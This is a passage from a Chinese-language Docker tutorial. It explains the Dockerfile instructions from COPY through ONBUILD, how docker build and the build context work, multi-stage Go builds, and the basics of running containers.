可以看到其中为了redis服务创建了redis用户,并在最后指定了ENTRYPOINT为docker-entrypoint.sh脚本。

#!/bin/sh
...
# allow the container to be started with `--user`
if [ "$1" = 'redis-server' -a "$(id -u)" = '0' ]; then
    chown -R redis .
    exec su-exec redis "$0" "$@"
fi
exec "$@"

该脚本的内容就是根据CMD的内容来判断,如果是redis-server的话,则切换到redis用户身份启动服务器,否则依旧使用root身份执行。
$ docker run -it redis id
uid=0(root) gid=0(root) groups=0(root)

【 COPY指令复制文件 】
和RUN指令一样,也有两种格式,一种类似于命令行,一种类似于函数调用
COPY <源路径>... <目标路径>
COPY ["<源路径1>",... "<目标路径>"]

COPY指令功能类似ADD,但不会自动解压文件,也不能访问网络资源
COPY指令用来将本地(默认Dockerfile所在位置)的文件或文件夹复制到编译环境的指定路径下
COPY指令将从构建上下文目录中源路径的文件或目录复制到新的一层的镜像内的目标路径位置
COPY package.json /usr/src/app/

源路径可以是多个甚至是通配符,其通配符规则要满足Go的filepath.Match规则
COPY hom* /mydir/
COPY hom?.txt /mydir/

目标路径可以是容器内的绝对路径,也可以是相对于工作目录的相对路径(工作目录可以用WORKDIR指令来指定)。目标路径不需要事先创建,如果目录不存在会在复制文件前先行创建缺失目录。

使用COPY指令源文件的各种元数据都会保留,比如读、写、执行权限、文件变更时间等,这个特性对于镜像定制很有用,特别是构建相关文件都在使用Git进行管理的时候。

【 ADD指令 更高级的复制文件 】
ADD指令和COPY的格式和性质基本一致,但在COPY基础上增加了一些功能。
比如源路径可以是一个URL,这种情况Docker引擎会试图去下载这个链接的文件放到目标路径去。
下载后的文件权限自动设置为600,如果想修改权限还需要增加额外的一层RUN进行权限调整;
如果下载的是个压缩包需要解压缩,也一样还需要额外的一层RUN指令进行解压缩。
所以不如直接使用RUN指令,然后使用wget或curl工具下载,处理权限、解压缩、然后清理无用文件更合理。
因此这个功能其实并不实用,而且不推荐使用。

ADD指令将本地文件添加到容器中,tar类型文件会自动解压(网络压缩资源不会被解压),可以访问网络资源,类似wget

如果源路径为一个tar压缩文件的话,压缩格式为gzip, bzip2以及xz的情况下,ADD指令将会自动解压缩这个压缩文件到目标路径去
在某些情况下,这个自动解压缩的功能非常有用,比如官方镜像ubuntu中:
FROM scratch
ADD ubuntu-xenial-core-cloudimg-amd64-root.tar.gz /

但在某些情况下,如果希望复制个压缩文件进去,而不解压缩,这时就不可以使用ADD命令了。

在Docker官方的Dockerfile最佳实践文档中要求,尽可能的使用COPY,因为COPY的语义很明确,就是复制文件而已,而ADD则包含了更复杂的功能,其行为也不一定很清晰。最适合使用ADD的场合,就是所提及的需要自动解压缩的场合。

另外需要注意的是,ADD指令会令镜像构建缓存失效,从而可能会令镜像构建变得比较缓慢。

因此所有的文件复制均使用COPY指令,仅在需要自动解压缩的场合使用ADD

如果Dockerfile有多个步骤需要使用上下文中不同的文件。单独COPY每个文件,而不是一次性的COPY所有文件,这将保证每个步骤的构建缓存只在特定的文件变化时失效。例如:
COPY requirements.txt /tmp/
RUN pip install --requirement /tmp/requirements.txt
COPY . /tmp/
如果将 COPY . /tmp/ 放置在 RUN 指令之前,只要 . 目录中任何一个文件变化,都会导致后续指令的缓存失效。

为了让镜像尽量小,最好不要使用ADD指令从远程URL获取包,而是使用curl和wget。这样可以在文件提取完之后删掉不再需要的文件来避免在镜像中额外添加一层。比如尽量避免下面的用法:
ADD http://example.com/big.tar.xz /usr/src/things/
RUN tar -xJf /usr/src/things/big.tar.xz -C /usr/src/things
RUN make -C /usr/src/things all
而是应该使用下面这种方法:
RUN mkdir -p /usr/src/things \
    && curl -SL http://example.com/big.tar.xz \
    | tar -xJC /usr/src/things \
    && make -C /usr/src/things all
上面使用的管道操作,所以没有中间文件需要删除。

【 ENV指令 设置环境变量 】
格式有两种:
ENV < key > < value >
ENV < key1 >=< value1 > < key2 >=< value2 >...

ENV指令是设置环境变量,无论是后面的其它指令如RUN,还是运行时的应用,都可以直接使用这里定义的环境变量。
ENV指令用来指定在执行docker run命令运行镜像时自动设置的环境变量,这些环境变量可以通过docker run命令的--evn参数来进行修改
为了方便新程序运行,可以使用ENV来为容器中安装的程序更新PATH环境变量。例如使用 ENV PATH /usr/local/nginx/bin:$PATH 确保CMD ["nginx"]能正确运行。
ENV指令也可用于为想要容器化的服务提供必要的环境变量,比如Postgres需要的PGDATA

ENV VERSION=1.0 DEBUG=on \
    NAME="Happy Feet"

定义了环境变量之后就可以在后续的指令中使用这个环境变量。比如在官方node镜像Dockerfile中,就有类似这样的代码,RUN多次使用$NODE_VERSION来进行操作定制,将来升级镜像构建版本的时候,只需要更新7.2.0即可,Dockerfile构建维护变得更轻松了。类似于程序中的常量,这种方法可以只需改变ENV指令来自动的改变容器中的软件版本
ENV NODE_VERSION 7.2.0
RUN curl -SLO "https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz" \
  && curl -SLO "https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc" \
  && gpg --batch --decrypt --output SHASUMS256.txt SHASUMS256.txt.asc \
  && grep " node-v$NODE_VERSION-linux-x64.tar.xz\$" SHASUMS256.txt | sha256sum -c - \
  && tar -xJf "node-v$NODE_VERSION-linux-x64.tar.xz" -C /usr/local --strip-components=1 \
  && rm "node-v$NODE_VERSION-linux-x64.tar.xz" SHASUMS256.txt.asc SHASUMS256.txt \
  && ln -s /usr/local/bin/node /usr/local/bin/nodejs

下列指令可以支持环境变量展开: ADD、COPY、ENV、EXPOSE、LABEL、USER、WORKDIR、VOLUME、STOPSIGNAL、ONBUILD。
可以从这个指令列表里感觉到环境变量可以使用的地方很多很强大。通过环境变量可以让一份Dockerfile制作更多的镜像,只需使用不同的环境变量即可。

【 ARG 构建参数 】
格式:ARG <参数名>[=<默认值>]

构建参数和ENV的效果一样,都是设置环境变量,不同的是ARG所设置的构建环境的环境变量,在将来容器运行时是不会存在这些环境变量的,但不要因此就使用ARG保存密码之类的信息,因为docker history还是可以看到所有值的。

ARG指令是定义参数名称及定义其默认值,该默认值可以在构建命令docker build中用--build-arg <参数名>=<值>来覆盖

在1.13之前的版本,要求--build-arg中的参数名必须在Dockerfile中用ARG定义过了,即--build-arg指定的参数必须在Dockerfile中使用了,如果对应参数没有被使用则会报错退出构建。
从1.13开始,这种严格的限制被放开不再报错退出,而是显示警告信息并继续构建。这对于使用CI系统,用同样的构建流程构建不同的Dockerfile的时候比较有帮助,避免构建命令必须根据每个Dockerfile的内容修改。

【 VOLUME指令 定义匿名卷 】
VOLUME指令用于在容器内创建一个或多个卷,常用来在执行docker run时指定要创建的卷及本地路径来进行映射
VOLUME用于暴露任何数据库存储文件、配置文件或容器创建的文件和目录,强烈建议使用VOLUME来管理镜像中的可变部分和用户可以改变的部分

格式为:
VOLUME ["<路径1>", "<路径2>"...]
VOLUME <路径>

容器运行时应该尽量保持容器存储层不发生写操作,对于数据库类需要保存动态数据的应用,其数据库文件应该保存于卷volume中
为了防止运行时用户忘记将动态文件所保存目录挂载为卷,在Dockerfile中可以事先指定某些目录挂载为匿名卷,这样在运行时如果用户不指定挂载其应用也可以正常运行,不会向容器存储层写入大量数据。

VOLUME /data
这里的/data目录就会在运行时自动挂载为匿名卷,任何向/data中写入的信息都不会记录进容器存储层,从而保证了容器存储层的无状态化。当然运行时可以覆盖这个挂载设置。比如:
docker run -d -v mydata:/data xxxx  # 使用mydata这个命名卷挂载到了/data这个位置,替代了Dockerfile中定义的匿名卷的挂载配置。

【 EXPOSE指令 声明端口 】
格式为 EXPOSE <端口1> [<端口2>...]

EXPOSE指令是声明运行时容器提供服务端口,这只是一个声明,在运行时并不会因为这个声明应用就会开启这个端口的服务。
EXPOSE指令用于标明,这个镜像中的应用将会侦听指定的端口,并且希望能将这个端口映射到主机的网络界面上
为了安全,docker run命令如果没有带上响应的端口映射参数,docker并不会将端口映射出了

在Dockerfile中写入这样的声明有两个好处,一个是帮助镜像使用者理解这个镜像服务的守护端口,以方便配置映射;另一个用处则是在运行时使用随机端口映射时也就是docker run -P时会自动随机映射EXPOSE的端口。

在早期Docker版本中还有一个特殊的用处。以前所有容器都运行于默认桥接网络中,因此所有容器互相之间都可以直接访问,这样存在一定的安全性问题。于是有了一个Docker引擎参数--icc=false,当指定该参数后容器间将默认无法互访,除非互相间使用了--links参数的容器才可以互通,并且只有镜像中EXPOSE所声明的端口才可以被访问。这个--icc=false的用法在引入了docker network后已经基本不用了,通过自定义网络可以很轻松的实现容器间的互联与隔离。

要将EXPOSE和在运行时使用-p <宿主端口>:<容器端口> 区分开来
-p是映射宿主端口和容器端口,就是将容器的对应端口服务公开给外界访问
EXPOSE仅仅是声明容器打算使用什么端口而已,并不会自动在宿主进行端口映射。

【 WORKDIR指令 指定工作目录 】
格式为 WORKDIR <工作目录路径>

WORKDIR指令用于设置执行RUN指令、CMD指令和ENTRYPOINT指令执行时的工作目录,可以多次设置WORKDIR,在每次设置之后的命令将使用新的路径
使用WORKDIR指令可以来指定工作目录或当前目录,以后各层的当前目录就被改为指定的目录,如该目录不存在WORKDIR会建立目录。
为了清晰性和可靠性,应该总是在WORKDIR中使用绝对路径,应该使用WORKDIR来替代类似于RUN cd ... && do-something的指令,后者难以阅读、排错和维护

之前提到一些初学者常犯的错误是把Dockerfile等同于Shell脚本来书写,这种错误的理解还可能会导致出现下面这样的错误:
RUN cd /app
RUN echo "hello" > world.txt
如果将这个Dockerfile进行构建镜像运行后,会发现找不到/app/world.txt文件,或者其内容不是hello
原因其实很简单,在Shell中连续两行是同一个进程执行环境,因此前一个命令修改的内存状态会直接影响后一个命令
而在Dockerfile中,这两行RUN命令的执行环境根本不同,是两个完全不同的容器,这就是对Dockerfile构建分层存储的概念不了解所导致的错误。
每一个RUN都是启动一个容器、执行命令,然后提交存储层文件变更。第一层RUN cd /app的执行仅仅是当前进程的工作目录变更,一个内存上的变化而已,其结果不会造成任何文件变更。而到第二层的时候,启动的是一个全新的容器,跟第一层的容器更完全没关系,自然不可能继承前一层构建过程中的内存变化。
因此如果需要改变以后各层的工作目录的位置,那么应该使用WORKDIR指令。

【 USER指令 指定当前用户 】
格式:USER <用户名|用户ID>

USER指令用于容器内运行RUN指令或CMD指令的用户。例如在构建一个nginx镜像时希望最后运行nginx的用户为nginx,就可以在CMD ["nginx"]之前将用户设置为nginx。
如果在运行docker run命令时设置了-u用户名参数,那么将覆盖USER指令设置的用户
USER指令和WORKDIR相似,都是改变环境状态并影响以后的层。WORKDIR是改变工作目录,USER则是改变之后层的执行RUN、CMD及ENTRYPOINT这类命令的身份。

和WORKDIR一样,USER只是帮助切换到指定用户而已,这个用户必须是事先建立好的,否则无法切换。
RUN groupadd -r redis && useradd -r -g redis redis
USER redis
RUN [ "redis-server" ]

如果以root执行的脚本,在执行期间希望改变身份,比如希望以某个已经建立好的用户来运行某个服务进程,不要使用su或sudo,这些都需要比较麻烦的配置,而且在TTY缺失的环境下经常出错,,因为它不可预期的TTY和信号转发行为可能造成的问题比它能解决的问题还多,如果真的需要和sudo类似的功能(例如以root权限初始化某个守护进程,以非root权限执行它)可以使用gosu。

# 建立redis用户,并使用gosu换另一个用户执行命令
RUN groupadd -r redis && useradd -r -g redis redis
# 下载 gosu
RUN wget -O /usr/local/bin/gosu "https://github.com/tianon/gosu/releases/download/1.7/gosu-amd64" \
    && chmod +x /usr/local/bin/gosu \
    && gosu nobody true
# 设置CMD,并以另外的用户执行
CMD [ "exec", "gosu", "redis", "redis-server" ]

如果某个服务不需要特权执行,建议使用USER指令切换到非root用户。先在Dockerfile中使用类似RUN groupadd -r postgres && useradd -r -g postgres postgres 的指令创建用户和用户组。

在镜像中用户和用户组每次被分配的UID/GID都是不确定的,下次重新构建镜像时被分配到的UID/GID可能会不一样。如果要依赖确定的UID/GID应该显示的指定一个UID/GID。

为了减少层数和复杂度,避免频繁地使用USER来回切换用户

【 HEALTHCHECK指令 健康检查 】
HEALTHCHECK [选项] CMD <命令>:设置检查容器健康状况的命令
HEALTHCHECK NONE:如果基础镜像有健康检查指令,使用这行可以屏蔽掉其健康检查指令

HEALTHCHECK指令是告诉Docker应该如何进行判断容器的状态是否正常,这是Docker 1.12引入的新指令。

在没有HEALTHCHECK指令前,Docker引擎只可以通过容器内主进程是否退出来判断容器是否状态异常。很多情况下这没问题,但如果程序进入死锁状态或死循环状态,应用进程并不退出,但该容器已经无法提供服务了。在1.12以前,Docker不会检测到容器的这种状态,从而不会重新调度,导致可能会有部分容器已经无法提供服务了却还在接受用户请求。
1.12之后,Docker提供了HEALTHCHECK指令,通过该指令指定一行命令,用这行命令来判断容器主进程的服务状态是否还正常,从而比较真实的反应容器实际状态。

当在一个镜像指定了HEALTHCHECK指令后,用其启动容器,初始状态会为starting,在HEALTHCHECK指令检查成功后变为healthy,如果连续一定次数失败,则会变为unhealthy。

HEALTHCHECK支持下列选项:
--interval=<间隔>:两次健康检查的间隔,默认30秒;
--timeout=<时长>:健康检查命令运行超时时间,如果超过这个时间本次健康检查就被视为失败,默认30秒;
--retries=<次数>:当连续失败指定次数后则将容器状态视为unhealthy,默认3次。

和CMD, ENTRYPOINT一样,HEALTHCHECK只可以出现一次,如果写了多个则只有最后一个生效。

在HEALTHCHECK [选项] CMD后面的命令,格式和ENTRYPOINT一样,分为shell格式和exec格式。命令的返回值决定了该次健康检查的成功与否,0:成功;1:失败;2:保留,不要使用这个值。

假设有个镜像是个最简单的Web服务,希望增加健康检查来判断其Web服务是否在正常工作,可以用curl来帮助判断,其Dockerfile的HEALTHCHECK可以这么写:
FROM nginx
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
HEALTHCHECK --interval=5s --timeout=3s \
  CMD curl -fs http://localhost/ || exit 1
设置了每5秒检查一次(这里为了试验所以间隔非常短,实际应该相对较长),如果健康检查命令超过3秒没响应就视为失败,并且使用curl -fs http://localhost/ || exit 1作为健康检查命令。

使用docker build来构建这个镜像:
$ docker build -t myweb:v1 .
构建好了后启动一个容器:
$ docker run -d --name web -p 80:80 myweb:v1
当运行该镜像后可以通过docker container ls看到最初的状态为(health: starting):
$ docker container ls
CONTAINER ID IMAGE    COMMAND                CREATED       STATUS                          PORTS                NAMES
03e28eb00bd0 myweb:v1 "nginx -g 'daemon off" 3 seconds ago Up 2 seconds(health: starting)   80/tcp,  443/tcp     web

在等待几秒钟后,再次docker container ls,就会看到健康状态变化为了(healthy):
$ docker container ls
CONTAINER ID IMAGE    COMMAND                CREATED        STATUS                  PORTS           NAMES
03e28eb00bd0 myweb:v1 "nginx -g 'daemon off" 18 seconds ago Up 16 seconds(healthy) 80/tcp, 443/tcp web

如果健康检查连续失败超过了重试次数,状态就会变为(unhealthy)。

为了帮助排障,健康检查命令的输出(包括stdout及stderr)都会被存储于健康状态里,可以用docker inspect来查看。
$ docker inspect --format '{{json .State.Health}}' web | python -m json.tool

【 ONBUILD指令 为他人做嫁衣裳 】
格式:ONBUILD <其它指令>

ONBUILD指令用于设置一些指令,当本镜像作为基础镜像被其他Dockerfile用FROM指令引用时,在所有其他指令执行之前先执行这些指令
ONBUILD是一个特殊的指令,它后面跟的是其它指令,比如RUN, COPY等,而这些指令在当前镜像构建时并不会被执行。只有当以当前镜像为基础镜像去构建下一级镜像的时候才会被执行。
Dockerfile中的其它指令都是为了定制当前镜像而准备的,唯有ONBUILD是为了帮助别人定制自己而准备的。

假设要制作Node.js所写的应用的镜像。Node.js使用npm进行包管理,所有依赖、配置、启动信息等会放到package.json文件里。在拿到程序代码后,需要先进行npm install才可以获得所有需要的依赖,然后就可以通过npm start来启动应用,因此一般会这样写Dockerfile:

FROM node:slim
RUN mkdir /app
WORKDIR /app
COPY ./package.json /app
RUN [ "npm", "install" ]
COPY . /app/
CMD [ "npm", "start" ]

把这个Dockerfile放到Node.js项目的根目录,构建好镜像后就可以直接拿来启动容器运行
但如果还有第二个Node.js项目也差不多呢？那就再把这个Dockerfile复制到第二个项目里。那如果有第三个项目呢？再复制么？文件的副本越多,版本控制就越困难,继续看这样的场景维护的问题。

如果第一个Node.js项目在开发过程中,发现这个Dockerfile里存在问题,比如敲错字或需要安装额外的包,然后开发人员修复了这个Dockerfile,再次构建问题解决。第一个项目没问题了,但是第二个项目呢？虽然最初Dockerfile是复制、粘贴自第一个项目的,但并不会因为第一个项目修复了他们的Dockerfile,而第二个项目的Dockerfile就会被自动修复。
那么可不可以做一个基础镜像,然后各个项目使用这个基础镜像呢？这样基础镜像更新,各个项目不用同步Dockerfile的变化,重新构建后就继承了基础镜像的更新？好吧,可以,看看这样的结果。那么上面的这个Dockerfile就会变为:

FROM node:slim
RUN mkdir /app
WORKDIR /app
CMD [ "npm", "start" ]

把项目相关的构建指令拿出来,放到子项目里去。假设这个基础镜像的名字为my-node的话,各个项目内的自己的Dockerfile就变为:

FROM my-node
COPY ./package.json /app
RUN [ "npm", "install" ]
COPY . /app/

基础镜像变化后,各个项目都用这个Dockerfile重新构建镜像,会继承基础镜像的更新。

问题只解决了一半。如果这个Dockerfile里面有些东西需要调整呢？比如npm install都需要加一些参数,那怎么办？这一行RUN是不可能放入基础镜像的,因为涉及到了当前项目的./package.json,难道又要一个个修改么？所以说这样制作基础镜像,只解决了原来的Dockerfile的前4条指令的变化问题,而后面三条指令的变化则完全没办法处理。

ONBUILD可以解决这个问题。用ONBUILD重新写一下基础镜像的Dockerfile:
FROM node:slim
RUN mkdir /app
WORKDIR /app
ONBUILD COPY ./package.json /app
ONBUILD RUN [ "npm", "install" ]
ONBUILD COPY . /app/
CMD [ "npm", "start" ]

这次回到原始的Dockerfile,但这次将项目相关的指令加上ONBUILD,这样在构建基础镜像的时候,这三行并不会被执行,然后各个项目的Dockerfile就变成了简单地:
FROM my-node
只有这么一行。当在各个项目目录中,用这个只有一行的Dockerfile构建镜像时,之前基础镜像的那三行ONBUILD就会开始执行,成功的将当前项目的代码复制进镜像、并且针对本项目执行npm install,生成应用镜像。

</pre>

<h4>docker build命令构建镜像</h4><pre>
docker build命令用于从Dockerfile构建映像
docker build -f /path/to/a/Dockerfile  // -f标志指向文件系统中任何位置的Dockerfile

在Dockerfile文件所在目录执行:
$ docker build -t nginx:b2 .
Sending build context to Docker daemon  2.048kB
Step 1/2 : FROM nginx
  ---> 3c5a05123222
Step 2/2 : RUN echo 'hello, docker' > /usr/share/nginx/html/index.html
  ---> Running in de998bdf0218
Removing intermediate container de998bdf0218
  ---> d725fcbc9ee4
Successfully built d725fcbc9ee4
Successfully tagged nginx:b2

从命令的输出结果中可以清晰的看到镜像的构建过程。在Step 2中RUN指令启动了一个容器de998bdf0218,执行了所要求的命令,并最后提交了这一层d725fcbc9ee4,随后删除了所用到的这个容器de998bdf0218

使用docker build命令进行镜像构建,格式为:
docker build [选项] <上下文路径/URL/->
在这里指定了最终镜像的名称 -t nginx:v3,构建成功后可以像之前运行nginx:v2那样来运行这个镜像,其结果会和nginx:b1一样

【 镜像构建上下文Context 】
上面docker build命令最后有一个表示当前目录的.,而Dockerfile就在当前目录,因此不少初学者以为这个路径是在指定Dockerfile所在路径,这么理解其实是不准确的。如果对应上面的命令格式,可能会发现这是在指定上下文路径

docker build的工作原理
Docker在运行时分为Docker引擎(也就是服务端守护进程)和客户端工具。
Docker的引擎提供了一组REST API被称为Docker Remote API,而如docker命令这样的客户端工具则是通过这组API与Docker引擎交互从而完成各种功能。因此表面上好像是在本机执行各种docker功能,但实际上一切都是使用的远程调用形式在服务端(Docker引擎)完成,也因为这种C/S设计让操作远程服务器的Docker引擎变得轻而易举。

进行镜像构建的时候,并非所有定制都会通过RUN指令完成,经常会需要将一些本地文件复制进镜像,比如通过COPY指令、ADD指令等。而docker build命令构建镜像,其实并非在本地构建,而是在服务端,也就是Docker引擎中构建的。那么在这种客户端/服务端的架构中,如何才能让服务端获得本地文件呢？

这就引入了上下文的概念。当构建的时候用户会指定构建镜像上下文的路径,docker build命令得知这个路径后会将路径下的所有内容打包,然后上传给Docker引擎,这样Docker引擎收到这个上下文包后,展开就会获得构建镜像所需的一切文件。

如果在Dockerfile中这么写:
COPY ./package.json /app/
这并不是要复制执行docker build命令所在的目录下的package.json,也不是复制Dockerfile所在目录下的package.json,而是复制上下文(context)目录下的package.json。

因此COPY这类指令中的源文件的路径都是相对路径。这也是初学者经常会问的为什么COPY ../package.json /app或COPY /opt/xxxx /app无法工作的原因,因为这些路径已经超出了上下文的范围,Docker引擎无法获得这些位置的文件。如果真的需要那些文件,应该将它们复制到上下文目录中去。

现在就可以理解刚才的命令docker build -t nginx:b2 . 中的这个 .,实际上是在指定上下文的目录,docker build命令会将该目录下的内容打包交给Docker引擎以帮助构建镜像。

如果观察docker build输出,其实已经看到了这个发送上下文的过程:
理解构建上下文对于镜像构建是很重要的,避免犯一些不应该的错误。比如有些初学者在发现 COPY /opt/xxxx /app 不工作后,于是干脆将Dockerfile放到了硬盘根目录去构建,结果发现docker build执行后,在发送一个几十GB的东西,极为缓慢且很容易构建失败,那是因为这种做法是在让docker build打包整个硬盘,这显然是使用错误。

一般应该会将Dockerfile置于一个空目录或项目根目录下。如果该目录下没有所需文件,那么应该把所需文件复制一份过来。如果目录下有些东西确实不希望构建时传给Docker引擎,那么可以用.gitignore一样的语法写一个.dockerignore,该文件是用于剔除不需要作为上下文传递给Docker引擎的。

那么为什么会有人误以为 . 是指定Dockerfile所在目录呢？这是因为在默认情况下,如果不额外指定Dockerfile的话,会将上下文目录下的名为Dockerfile的文件作为Dockerfile。

这只是默认行为,实际上Dockerfile的文件名并不要求必须为Dockerfile,而且并不要求必须位于上下文目录中,比如可以用-f ../Dockerfile.php参数指定某个文件作为Dockerfile。

当然,一般大家习惯性的会使用默认的文件名Dockerfile,以及会将其置于镜像构建上下文目录中。

【 其它docker build的用法 】
1、直接用Git repo进行构建
docker build还支持从URL构建,比如可以直接从Git repo中构建:
$ docker build https://github.com/twang2218/gitlab-ce-zh.git#:8.14
这行命令指定了构建所需的Git repo,并且指定默认的master分支,构建目录为/8.14/,然后Docker就会去git clone这个项目、切换到指定分支并进入到指定目录后开始构建。

2、用给定的tar压缩包构建
$ docker build http://server/context.tar.gz
如果所给出的URL不是个Git repo,而是个tar压缩包,那么Docker引擎会下载这个包,并自动解压缩,以其作为上下文,开始构建。

3、从标准输入中读取Dockerfile进行构建
docker build - < Dockerfile
或
cat Dockerfile | docker build -

如果标准输入传入的是文本文件,则将其视为Dockerfile并开始构建。这种形式由于直接从标准输入中读取Dockerfile的内容,它没有上下文,因此不可以像其他方法那样可以将本地文件COPY进镜像之类的事情。

4、从标准输入中读取上下文压缩包进行构建
$ docker build - < context.tar.gz
如果发现标准输入的文件格式是gzip、bzip2及xz的话,将会使其为上下文压缩包,直接将其展开,将里面视为上下文,并开始构建。

</pre>

<h4>多阶段构建</h4><pre>
Docker17.05版本之前构建Docker镜像时通常会采用两种方式:

【 全部放入一个Dockerfile 】
一种方式是将所有的构建过程包含在一个Dockerfile中,包括项目及其依赖库的编译、测试、打包等流程,这里可能会带来的一些问题:
Dockerfile特别长,可维护性降低
镜像层次多,镜像体积较大,部署时间变长
源代码存在泄露的风险

例如编写app.go文件,该程序输出Hello World!
package main
import "fmt"
func main(){
    fmt.Printf("Hello World!");
}

编写Dockerfile.one文件
FROM golang:1.9-alpine
RUN apk --no-cache add git ca-certificates
WORKDIR /go/src/github.com/go/helloworld/
COPY app.go .
RUN go get -d -v github.com/go-sql-driver/mysql \
  && CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app . \
  && cp /go/src/github.com/go/helloworld/app /root
WORKDIR /root/
CMD ["./app"]

构建镜像
$ docker build -t go/helloworld:1 -f Dockerfile.one .

【 分散到多个 Dockerfile 】
另一种方式就是事先在一个Dockerfile将项目及其依赖库编译测试打包好后,再将其拷贝到运行环境中,这种方式需要编写两个Dockerfile和一些编译脚本才能将其两个阶段自动整合起来,这种方式虽然可以很好地规避第一种方式存在的风险,但明显部署过程较复杂。

例如编写Dockerfile.build 文件
FROM golang:1.9-alpine
RUN apk --no-cache add git
WORKDIR /go/src/github.com/go/helloworld
COPY app.go .
RUN go get -d -v github.com/go-sql-driver/mysql \
  && CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .

编写Dockerfile.copy文件
FROM alpine:latest
RUN apk --no-cache add ca-certificates
WORKDIR /root/
COPY app .
CMD ["./app"]

新建 build.sh
#!/bin/sh
echo Building go/helloworld:build
docker build -t go/helloworld:build . -f Dockerfile.build
docker create --name extract go/helloworld:build
docker cp extract:/go/src/github.com/go/helloworld/app ./app
docker rm -f extract
echo Building go/helloworld:2
docker build --no-cache -t go/helloworld:2 . -f Dockerfile.copy
rm ./app

现在运行脚本即可构建镜像
$ chmod +x build.sh
$ ./build.sh

对比两种方式生成的镜像大小
$ docker image ls
REPOSITORY      TAG    IMAGE ID        CREATED         SIZE
go/helloworld   2      f7cf3465432c    22 seconds ago  6.47MB
go/helloworld   1      f55d3e16affc    2 minutes ago   295MB

【 使用多阶段构建(multistage builds) 】
,Docker v17.05开始支持使用多阶段构建,可以很容易解决前面提到的问题,并且只需要编写一个Dockerfile:

例如编写Dockerfile文件
FROM golang:1.9-alpine as builder
RUN apk --no-cache add git
WORKDIR /go/src/github.com/go/helloworld/
RUN go get -d -v github.com/go-sql-driver/mysql
COPY app.go .
RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .
FROM alpine:latest as prod
RUN apk --no-cache add ca-certificates
WORKDIR /root/
COPY --from=0 /go/src/github.com/go/helloworld/app .
CMD ["./app"]

构建镜像
$ docker build -t go/helloworld:3 .

对比三个镜像大小
$ docker image ls
REPOSITORY        TAG   IMAGE ID         CREATED            SIZE
go/helloworld     3     d6911ed9c846     7 seconds ago      6.47MB
go/helloworld     2     f7cf3465432c     22 seconds ago     6.47MB
go/helloworld     1     f55d3e16affc     2 minutes ago      295MB

很明显使用多阶段构建的镜像体积小,同时也完美解决了上边提到的问题。

只构建某一阶段的镜像
可以使用as来为某一阶段命名,例如
FROM golang:1.9-alpine as builder
例如只想构建builder阶段的镜像时,可以在使用docker build命令时加上 --target 参数即可
$ docker build --target builder -t username/imagename:tag .

构建时从其他镜像复制文件
上面例子中使用 COPY --from=0 /go/src/github.com/go/helloworld/app . 从上一阶段的镜像中复制文件,也可以复制任意镜像中的文件。
$ COPY --from=nginx:latest /etc/nginx/nginx.conf /nginx.conf

</pre>
</div>

<div id="docker_container">
<h3>容器(Container)——镜像运行时的实体</h3><pre>
镜像(Image)和容器(Container)的关系,就像是面向对象程序设计中的类和实例一样,镜像是静态的定义,容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等

容器是独立运行的一个或一组应用及它们的运行态环境。对应的,虚拟机可以理解为模拟运行的一整套操作系统(提供运行态环境和其他系统环境)和跑在上面的应用

【 docker容器的进程原理 】
容器的实质是进程,但与直接在宿主执行的进程不同,容器进程运行于属于自己的独立的命名空间。因此容器可以拥有自己的root文件系统、网络配置、进程空间,甚至用户ID空间。容器内的进程是运行在一个隔离的环境里,使用起来就好像是在一个独立于宿主的系统下操作一样。这种特性使得容器封装的应用比直接在宿主运行更加安全。也因为这种隔离的特性,很多人初学Docker时常常会混淆容器和虚拟机。

因为docker启动容器在宿主机上来看就是一个进程,宿主机对所有的运行程序都有控制权限,可以看到相应容器的进程。
隔离指的是容器之间的隔离,在一个容器内是无法访问到另一个容器的内容,可以exec到一个容器内部再ps看一下

如果要在宿主机上配置nginx,那么需要让宿主机的nginx和容器中的nginx监听不同的端口,否则会冲突。容器启动时可以通过-p将80转到宿主机上另一个端口,这样就不会和宿主机上默认的端口冲突

docker容器默认会把容器内部第一个进程即pid=1的程序作为docker容器是否正在运行的依据,如果docker容器pid挂了,那么docker容器便会直接退出
docker run的时候把command作为容器内部命令,如果使用nginx,那么nginx程序将后台运行,这个时候nginx并不是pid为1的程序,而是执行的bash,这个bash执行了nginx指令后就挂了,所以容器也就退出了

$ vi file get_pid
echo "PID of this script: $$"
echo "PPID of this script: $PPID"
echo "UID of this script: $UID"
#nginx -g 'daemon off;'

镜像使用的是分层存储,容器也是如此。每一个容器运行时是以镜像为基础层,在其上创建一个当前容器的存储层,可以称这个为容器运行时读写而准备的存储层为容器存储层。
容器存储层的生存周期和容器一样,容器消亡时容器存储层也随之消亡,因此任何保存于容器存储层的信息都会随容器删除而丢失。
按照Docker最佳实践的要求,容器不应该向其存储层内写入任何数据,容器存储层要保持无状态化。所有的文件写入操作都应该使用数据卷(Volume)或绑定宿主目录,在这些位置的读写会跳过容器存储层,直接对宿主(或网络存储)发生读写,其性能和稳定性更高。数据卷的生存周期独立于容器,容器消亡,数据卷不会消亡。因此使用数据卷后,容器可以随意删除、重新run,数据却不会丢失。

</pre>

<h4>启动、停止容器</h4><pre>
docker run命令用于根据镜像文件创建并启动一个容器实例
一个容器实例就是宿主机器上的一个独立的进程,每次执行docker run就创建一个Docker容器进程,拥有独立的文件系统、网络和进程树

当利用docker run来创建容器时,Docker在后台运行的标准操作包括:
1、检查本地是否存在指定的镜像,不存在就从公有仓库下载
2、利用镜像创建并启动一个容器
3、分配一个文件系统,并在只读的镜像层外面挂载一层可读写层
4、从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去
5、从地址池配置一个ip地址给容器
6、执行用户指定的应用程序
7、执行完毕后容器被终止

sudo docker run [OPTIONS] IMAGE[:TAG] [COMMAND] [ARG...]

Docker容器进程有两种运行模式
1) 前台模式(默认),只有在前台模式下才有必要设置-it命令选项,为容器设置伪TTY
docker run ...
docker run -d=false ...

2) 后台模式(也称detached模式),只要有-d命令选项就没有-it命令选项
docker run -d ...
docker run -d=true ...

docker run -itd image_name /bin/bash
docker run -it ubuntu bash
docker run -it ubuntu /bin/bash

正确退出容器ubuntu系统方式:
